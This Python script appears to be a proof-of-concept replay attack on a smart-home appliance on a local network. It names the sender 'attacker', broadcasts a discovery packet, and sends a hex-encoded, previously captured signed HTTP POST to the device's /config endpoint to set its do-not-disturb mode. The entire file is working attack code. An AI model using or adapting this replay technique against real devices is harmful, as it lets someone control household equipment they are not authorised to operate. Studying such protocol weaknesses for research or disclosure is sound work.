import json
import socket

attackerIP = "10.13.0.1"
attackerPort = 9989
bufferSize = 512
UDPServerSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
UDPServerSocket.bind((attackerIP, attackerPort))
UDPServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
devicesAddressPort = ("255.255.255.255", 9988)
print("send Broadcast")
bytesToSend = bytes.fromhex(
    "7b226964223a226434656638613536346538373032346235336664343766636464656639383630222c226465764e616d65223a222a227d")
#UDPServerSocket.sendto(bytesToSend, devicesAddressPort)

#while (True):
#    bytesAddressPair = UDPServerSocket.recvfrom(bufferSize)
#    message = bytesAddressPair[0]
#    print(message.decode())
#    break

#tcpPayload = bytes.fromhex(
    #"504f5354202f636f6e66696720485454502f312e310d0a436f6e6e656374696f6e3a20636c6f73650d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e3b20636861727365743d5554462d380d0a436f6e74656e742d4c656e6774683a203333340d0a486f73743a2031302e31332e302e33320d0a4163636570742d456e636f64696e673a20677a69700d0a557365722d4167656e743a206f6b687474702f332e31322e300d0a0d0a7b22686561646572223a7b2266726f6d223a22687474703a2f2f31302e31332e302e33322f636f6e666967222c226d6573736167654964223a223462376362616165336464303633303536306664306563646162393362313433222c226d6574686f64223a22534554222c226e616d657370616365223a224170706c69616e63652e53797374656d2e444e444d6f6465222c227061796c6f616456657273696f6e223a312c227369676e223a226363623738346138353430633239356637366465643339316538326537646533222c2274696d657374616d70223a313639333930303935392c2274726967676572537263223a22416e64726f69644c6f63616c222c2275756964223a223232313031393732363931343537363130373032343865316539616265633162227d2c227061796c6f6164223a7b22444e444d6f6465223a7b226d6f6465223a307d7d7d")

tcpPayload = bytes.fromhex(
    "504f5354202f636f6e66696720485454502f312e310d0a436f6e6e656374696f6e3a20636c6f73650d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e3b20636861727365743d5554462d380d0a436f6e74656e742d4c656e6774683a203333340d0a486f73743a2031302e31332e302e33320d0a4163636570742d456e636f64696e673a20677a69700d0a557365722d4167656e743a206f6b687474702f332e31322e300d0a0d0a7b22686561646572223a7b2266726f6d223a22687474703a2f2f31302e31332e302e33322f636f6e666967222c226d6573736167654964223a223637666433633937303032363830306661366433383363623437333861613335222c226d6574686f64223a22534554222c226e616d657370616365223a224170706c69616e63652e53797374656d2e444e444d6f6465222c227061796c6f616456657273696f6e223a312c227369676e223a223437343961363736363730313961616430613531383362383632346631326133222c2274696d657374616d70223a313639333834393735302c2274726967676572537263223a22416e64726f69644c6f63616c222c2275756964223a223232313031393732363931343537363130373032343865316539616265633162227d2c227061796c6f6164223a7b22444e444d6f6465223a7b226d6f6465223a317d7d7d")


print("send HTTP")
socket_used = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_used.connect(("10.13.0.32", 80))
socket_used.send(tcpPayload)
socket_used.settimeout(2)
received_payload = socket_used.recv(2048)
print('received payload=' + received_payload.decode('ISO-8859-1'))
